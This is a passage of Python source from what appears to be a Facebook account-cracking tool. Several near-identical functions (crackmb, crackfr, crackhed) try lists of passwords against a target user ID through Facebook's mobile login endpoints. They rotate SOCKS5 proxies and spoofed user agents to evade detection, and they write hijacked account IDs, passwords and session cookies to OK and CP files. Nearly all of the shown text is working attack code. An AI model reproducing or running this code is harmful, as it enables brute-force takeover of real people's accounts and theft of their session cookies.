D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DCfDJ8LvpYsQMXrtMh3GSiSxS193LRnY1qX_Oua8sXfjpqEeUXIdSdb5drE6jHgpjdD-gpqBl_uZmCtMlZe1p7xqrjZ7R0Eini0h01r3FiqJlAOf9GbWkP-ZAoCPzzmg7cBA2DNmjDAE9DonOueviwbbetQvCdI0TrgjgK4QIZkYfD4nNG3E4k6PcEveh-Nz6iVTgsvnohkzBJj9lJEjvw_d2_l3pOh0pmnTiG4wWtL3iDmb2HAO3liAefemcJynqN7bbmo04MOpljArC8YamWCPCnOraxpmc5EV0tt5DcZkPQgZ8ZYt_ErAze6y-dXtXBJAf7vxOpTZN2jWUKOZEn84OsVD7TtwY8XQCYXjar1s2pfsc5Z-Tp2p_zb06CX_o5UqzcESa6UiyuErGvUNA6zv0uJQbFfHfxfcKou3fFaw6pn2ohtoQK5Nlz-86z-7evzUmjfTp0v9Irl6gf1WaSVZ7C5RlzXPEhAuzzQukUC7Xk7DjjlG9pSln1efpYzY7R82tSDQh0lDpaHFIviAubLokK1q866Jsm2NP0r3jLV-eHeZk4FkMtvPR5gbN9gDYI52G0BSNCuk2ioYXVw2iFPh9_kxjbUrllZj5MIBTVfaifUs3jhFSzHLCcxlDCtC9IunXK7HZ5BsU0rj9re8GQCiiNklCDJBlaYTdosPpLnJYRMkMgdZf9YrX3HweidJqAuDQUATQ8Oc1f9FSTTXgYv-L2XMDz5yqrB4ZYWBBcr-jj5TCDDN_LdSA_XiFC-UBCs9AKROvMKp6ZsaG-Sp8avt2uhrVBHtGarzNEqovDlMSdP-SkqM4gbImArATmLJfE6W4I9J6yDWERBzjDi4gh3eTPuHxDPw1Fq2idAL0mSei0xcRUO2wNRDEOE1MgHTqqrOHRfCPrX6Kv9u6o1LWp0C_NWteEzpP6NTZmBnKO_c2SC7DIdWLYxNK70oBGRIQtJsXrqyvKgHCmJGTV-fenK1iTnCSeRA6NSNwGHeZyDvSpqfV4rCdz7_BP7_05Gp12N96mna3-Ii53_1MSoHjwrN2AGOvcMC_Wd0RKS93ajLkpumX47ghw78x6o0RyWkpjCWAVw6IYBtwPZiFmRMDrVALioUseiVK8B42cJ8RV_26hO7xPdf-2DY1RbyGtPW-S2LTiRRe5KT3mgep7_fbhDSDKT0kx70C_Wa_xlfuJPMr6a03C6-U_RIEr4t6qov9BJ2dNDOJmPlVgilc3EOPAFwWjV9Y01XSs6csSUHmXMfU1L0kVs4ahi3fX7lMV7Q-jrxU-VLdNXg7atC1IWy5-p-SOMgExweS3sIEoVYi_3Yqt8Kn6qgYTAQWNbxVJeAANb_rDf7N851mRfc_A4JC-zUXL4l9gbVS6_pfS6atQIdJgtAJlEuqlZDB3uDoQyee4yljHBN2XJCOQsN6l1gfvjqaSLlzPwHvWsMayMkXkFpEh8MqAK2Ahj_XfYtiSwc0mhWHZcDFdGBd46uq4SSJbhDXWSt20ZHUS9ME2lpQGk7kP7xvvyRYI0Vc7OQUnWQD9d6GXw8pjbgxfn2tu1q-VJzL_UK70T92sBM0pgp4qoxnm4x6rITxGThpISTvIqhsHiVaiSOj9lGVG0ZrJpbm-ZtcMzrNeTS1oVyhIp0jCkbCo19lS0LViHJrnOxSFwS6n4fgIirv0cLLJ6dtPJ7K1GxurWTMe0otxjIucBjRTEEmc80CBhuwRNNPmE4nJ-fZkoVKZJRvOu5UJ-ktn5GCXRZo4JQzXOck_gOrEqUcEaLImUCPgmWiIYLr6RUSx8zCGyoLZbzkYg315HnMLo5l552xFqQ48qayy531Lkm94BQOKNLAFXbqEavFgsoJWhDFPKPRZMROgnMl-bdamTL2rSOEHE0%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&rtime=1691708019&hrc=1&wtsid=rdr_0DU97QlYDCyA332wq&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(f" ")
				tree.add(f"[bold yellow]{idf}")
				tree.add(f"[bold yellow]{pw}").add(f"[bold yellow]{ua}{P}")
				tri(tree)
				open('CP/'+cpx,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in po.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree(f" ")
				tree.add(f"[bold green]{idf}")
				tree.add(f"[bold green]{pw}")
				tree.add(f"[bold green]{kuki}").add(f"[green]{ua}{P}")
				tri(tree)
				open('OK/'+okx,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1


def crackmb(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r{P} {loop}/{len(id)} [bold green]{ok}[/]-[bold yellow]{cp}[/]')
	prog.advance(des)
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fapp_id%3D337478968436079%26auth_type%26cbt%3D1679721253062%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df8cc5b70eaf224%2526domain%253Dlahelu.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Flahelu.com%25252Ff2951e90cedc318%2526relation%253Dopener%26client_id%3D337478968436079%26display%3Dtouch%26domain%3Dlahelu.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Flahelu.com%252F%26locale%3Den_US%26logger_id%3Df3c0e76557b0398%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2c4be6215ddc64%2526domain%253Dlahelu.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Flahelu.com%25252Ff2951e90cedc318%2526relation%253Dopener%2526frame%253Df16589cfba45cb%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dfalse%26scope%3Dpublic_profile%252C%2Bemail%26sdk%3Djoey%26version%3Dv13.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df2c4be6215ddc64%26domain%3Dlahelu.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Flahelu.com%252Ff2951e90cedc318%26relation%3Dopener%26frame%3Df16589cfba45cb%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=337478968436079&kid_directed_site=0&app_id=337478968436079&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fapp_id%3D337478968436079%26auth_type%26cbt%3D1679721253062%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df8cc5b70eaf224%2526domain%253Dlahelu.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Flahelu.com%25252Ff2951e90cedc318%2526relation%253Dopener%26client_id%3D337478968436079%26display%3Dtouch%26domain%3Dlahelu.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Flahelu.com%252F%26locale%3Den_US%26logger_id%3Df3c0e76557b0398%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2c4be6215ddc64%2526domain%253Dlahelu.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Flahelu.com%25252Ff2951e90cedc318%2526relation%253Dopener%2526frame%253Df16589cfba45cb%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dfalse%26scope%3Dpublic_profile%252C%2Bemail%26sdk%3Djoey%26version%3Dv13.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df2c4be6215ddc64%26domain%3Dlahelu.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Flahelu.com%252Ff2951e90cedc318%26relation%3Dopener%26frame%3Df16589cfba45cb%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fapp_id%3D337478968436079%26auth_type%26cbt%3D1679721253062%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df8cc5b70eaf224%2526domain%253Dlahelu.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Flahelu.com%25252Ff2951e90cedc318%2526relation%253Dopener%26client_id%3D337478968436079%26display%3Dtouch%26domain%3Dlahelu.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Flahelu.com%252F%26locale%3Den_US%26logger_id%3Df3c0e76557b0398%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2c4be6215ddc64%2526domain%253Dlahelu.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Flahelu.com%25252Ff2951e90cedc318%2526relation%253Dopener%2526frame%253Df16589cfba45cb%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dfalse%26scope%3Dpublic_profile%252C%2Bemail%26sdk%3Djoey%26version%3Dv13.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df2c4be6215ddc64%26domain%3Dlahelu.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Flahelu.com%252Ff2951e90cedc318%26relation%3Dopener%26frame%3Df16589cfba45cb%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(f" ")
				tree.add(f"[bold yellow]{idf}")
				tree.add(f"[bold yellow]{pw}").add(f"[bold yellow]{ua}{P}")
				tri(tree)
				open('CP/'+cpx,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in po.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree(f" ")
				tree.add(f"[bold green]{idf}")
				tree.add(f"[bold green]{pw}")
				tree.add(f"[bold green]{kuki}").add(f"[green]{ua}{P}")
				tri(tree)
				open('OK/'+okx,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1


def crackfr(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r{P} {loop}/{len(id)} [bold green]{ok}[/]-[bold yellow]{cp}[/]')
	prog.advance(des)
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua2,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=2774052252860772&kid_directed_site=0&app_id=2774052252860772&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D2774052252860772%26redirect_uri%3Dhttps%253A%252F%252Fshop.halosis.id%252Fcallback%252Ffacebook%26scope%3Demail%26response_type%3Dcode%26state%3DLS0taHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8%253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dc1c98b2b-6c28-4561-849a-3998b5e10697%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fshop.halosis.id%2Fcallback%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DLS0taHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8%253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'ms-MY,ms;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(f" ")
				tree.add(f"[bold yellow]{idf}")
				tree.add(f"[bold yellow]{pw}").add(f"[bold yellow]{ua}{P}")
				tri(tree)
				open('CP/'+cpx,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in po.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree(f" ")
				tree.add(f"[bold green]{idf}")
				tree.add(f"[bold green]{pw}")
				tree.add(f"[bold green]{kuki}").add(f"[green]{ua}{P}")
				tri(tree)
				open('OK/'+okx,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1


def crackhed(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r{P} {loop}/{len(id)} [bold green]{ok}[/]-[bold yellow]{cp}[/]')
	prog.advance(des)
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fclient_id%3D209104039103989%26scope%3Demail%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fasia-identity.oriflame.com%252Fsignin-facebook%26state%3DCfDJ8LvpYsQMXrtMh3GSiSxS193LRnY1qX_Oua8sXfjpqEeUXIdSdb5drE6jHgpjdD-gpqBl_uZmCtMlZe1p7xqrjZ7R0Eini0h01r3FiqJlAOf9GbWkP-ZAoCPzzmg7cBA2DNmjDAE9DonOueviwbbetQvCdI0TrgjgK4QIZkYfD4nNG3E4k6PcEveh-Nz6iVTgsvnohkzBJj9lJEjvw_d2_l3pOh0pmnTiG4wWtL3iDmb2HAO3liAefemcJynqN7bbmo04MOpljArC8YamWCPCnOraxpmc5EV0tt5DcZkPQgZ8ZYt_ErAze6y-dXtXBJAf7vxOpTZN2jWUKOZEn84OsVD7TtwY8XQCYXjar1s2pfsc5Z-Tp2p_zb06CX_o5UqzcESa6UiyuErGvUNA6zv0uJQbFfHfxfcKou3fFaw6pn2ohtoQK5Nlz-86z-7evzUmjfTp0v9Irl6gf1WaSVZ7C5RlzXPEhAuzzQukUC7Xk7DjjlG9pSln1efpYzY7R82tSDQh0lDpaHFIviAubLokK1q866Jsm2NP0r3jLV-eHeZk4FkMtvPR5gbN9gDYI52G0BSNCuk2ioYXVw2iFPh9_kxjbUrllZj5MIBTVfaifUs3jhFSzHLCcxlDCtC9IunXK7HZ5BsU0rj9re8GQCiiNklCDJBlaYTdosPpLnJYRMkMgdZf9YrX3HweidJqAuDQUATQ8Oc1f9FSTTXgYv-L2XMDz5yqrB4ZYWBBcr-jj5TCDDN_LdSA_XiFC-UBCs9AKROvMKp6ZsaG-Sp8avt2uhrVBHtGarzNEqovDlMSdP-SkqM4gbImArATmLJfE6W4I9J6yDWERBzjDi4gh3eTPuHxDPw1Fq2idAL0mSei0xcRUO2wNRDEOE1MgHTqqrOHRfCPrX6Kv9u6o1LWp0C_NWteEzpP6NTZmBnKO_c2SC7DIdWLYxNK70oBGRIQtJsXrqyvKgHCmJGTV-fenK1iTnCSeRA6NSNwGHeZyDvSpqfV4rCdz7_BP7_05Gp12N96mna3-Ii53_1MSoHjwrN2AGOvcMC_Wd0RKS93ajLkpumX47ghw78x6o0RyWkpjCWAVw6IYBtwPZiFmRMDrVALioUseiVK8B42cJ8RV_26hO7xPdf-2DY1RbyGtPW-S2LTiRRe5KT3mgep7_fbhDSDKT0kx70C_Wa_xlfuJPMr6a03C6-U_RIEr4t6qov9BJ2dNDOJmPlVgilc3EOPAFwWjV9Y01XSs6csSUHmXMfU1L0kVs4ahi3fX7lMV7Q-jrxU-VLdNXg7atC1IWy5-p-SOMgExweS3sIEoVYi_3Yqt8Kn6qgYTAQWNbxVJeAANb_rDf7N851mRfc_A4JC-zUXL4l9gbVS6_pfS6atQIdJgtAJlEuqlZDB3uDoQyee4yljHBN2XJCOQsN6l1gfvjqaSLlzPwHvWsMayMkXkFpEh8MqAK2Ahj_XfYtiSwc0mhWHZcDFdGBd46uq4SSJbhDXWSt20ZHUS9ME2lpQGk7kP7xvvyRYI0Vc7OQUnWQD9d6GXw8pjbgxfn2tu1q-VJzL_UK70T92sBM0pgp4qoxnm4x6rITxGThpISTvIqhsHiVaiSOj9lGVG0ZrJpbm-ZtcMzrNeTS1oVyhIp0jCkbCo19lS0LViHJrnOxSFwS6n4fgIirv0cLLJ6dtPJ7K1GxurWTMe0otxjIucBjRTEEmc80CBhuwRNNPmE4nJ-fZkoVKZJRvOu5UJ-ktn5GCXRZo4JQzXOck_gOrEqUcEaLImUCPgmWiIYLr6RUSx8zCGyoLZbzkYg315HnMLo5l552xFqQ48qayy531Lkm94BQOKNLAFXbqEavFgsoJWhDFPKPRZMROgnMl-bdamTL2rSOEHE0%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db1f44a2c-9d4b-43ed-a467-d0c10dc970f5%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fasia-identity.oriflame.com%2Fsignin-facebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DCfDJ8LvpYsQMXrtMh3GSiSxS193LRnY1qX_Oua8sXfjpqEeUXIdSdb5drE6jHgpjdD-gpqBl_uZmCtMlZe1p7xqrjZ7R0Eini0h01r3FiqJlAOf9GbWkP-ZAoCPzzmg7cBA2DNmjDAE9DonOueviwbbetQvCdI0TrgjgK4QIZkYfD4nNG3E4k6PcEveh-Nz6iVTgsvnohkzBJj9lJEjvw_d2_l3pOh0pmnTiG4wWtL3iDmb2HAO3liAefemcJynqN7bbmo04MOpljArC8YamWCPCnOraxpmc5EV0tt5DcZkPQgZ8ZYt_ErAze6y-dXtXBJAf7vxOpTZN2jWUKOZEn84OsVD7TtwY8XQCYXjar1s2pfsc5Z-Tp2p_zb06CX_o5UqzcESa6UiyuErGvUNA6zv0uJQbFfHfxfcKou3fFaw6pn2ohtoQK5Nlz-86z-7evzUmjfTp0v9Irl6gf1WaSVZ7C5RlzXPEhAuzzQukUC7Xk7DjjlG9pSln1efpYzY7R82tSDQh0lDpaHFIviAubLokK1q866Jsm2NP0r3jLV-eHeZk4FkMtvPR5gbN9gDYI52G0BSNCuk2ioYXVw2iFPh9_kxjbUrllZj5MIBTVfaifUs3jhFSzHLCcxlDCtC9IunXK7HZ5BsU0rj9re8GQCiiNklCDJBlaYTdosPpLnJYRMkMgdZf9YrX3HweidJqAuDQUATQ8Oc1f9FSTTXgYv-L2XMDz5yqrB4ZYWBBcr-jj5TCDDN_LdSA_XiFC-UBCs9AKROvMKp6ZsaG-Sp8avt2uhrVBHtGarzNEqovDlMSdP-SkqM4gbImArATmLJfE6W4I9J6yDWERBzjDi4gh3eTPuHxDPw1Fq2idAL0mSei0xcRUO2wNRDEOE1MgHTqqrOHRfCPrX6Kv9u6o1LWp0C_NWteEzpP6NTZmBnKO_c2SC7DIdWLYxNK70oBGRIQtJsXrqyvKgHCmJGTV-fenK1iTnCSeRA6NSNwGHeZyDvSpqfV4rCdz7_BP7_05Gp12N96mna3-Ii53_1MSoHjwrN2AGOvcMC_Wd0RKS93ajLkpumX47ghw78x6o0RyWkpjCWAVw6IYBtwPZiFmRMDrVALioUseiVK8B42cJ8RV_26hO7xPdf-2DY1RbyGtPW-S2LTiRRe5KT3mgep7_fbhDSDKT0kx70C_Wa_xlfuJPMr6a03C6-U_RIEr4t6qov9BJ2dNDOJmPlVgilc3EOPAFwWjV9Y01XSs6csSUHmXMfU1L0kVs4ahi3fX7lMV7Q-jrxU-VLdNXg7atC1IWy5-p-SOMgExweS3sIEoVYi_3Yqt8Kn6qgYTAQWNbxVJeAANb_rDf7N851mRfc_A4JC-zUXL4l9gbVS6_pfS6atQIdJgtAJlEuqlZDB3uDoQyee4yljHBN2XJCOQsN6l1gfvjqaSLlzPwHvWsMayMkXkFpEh8MqAK2Ahj_XfYtiSwc0mhWHZcDFdGBd46uq4SSJbhDXWSt20ZHUS9ME2lpQGk7kP7xvvyRYI0Vc7OQUnWQD9d6GXw8pjbgxfn2tu1q-VJzL_UK70T92sBM0pgp4qoxnm4x6rITxGThpISTvIqhsHiVaiSOj9lGVG0ZrJpbm-ZtcMzrNeTS1oVyhIp0jCkbCo19lS0LViHJrnOxSFwS6n4fgIirv0cLLJ6dtPJ7K1GxurWTMe0otxjIucBjRTEEmc80CBhuwRNNPmE4nJ-fZkoVKZJRvOu5UJ-ktn5GCXRZo4JQzXOck_gOrEqUcEaLImUCPgmWiIYLr6RUSx8zCGyoLZbzkYg315HnMLo5l552xFqQ48qayy531Lkm94BQOKNLAFXbqEavFgsoJWhDFPKPRZMROgnMl-bdamTL2rSOEH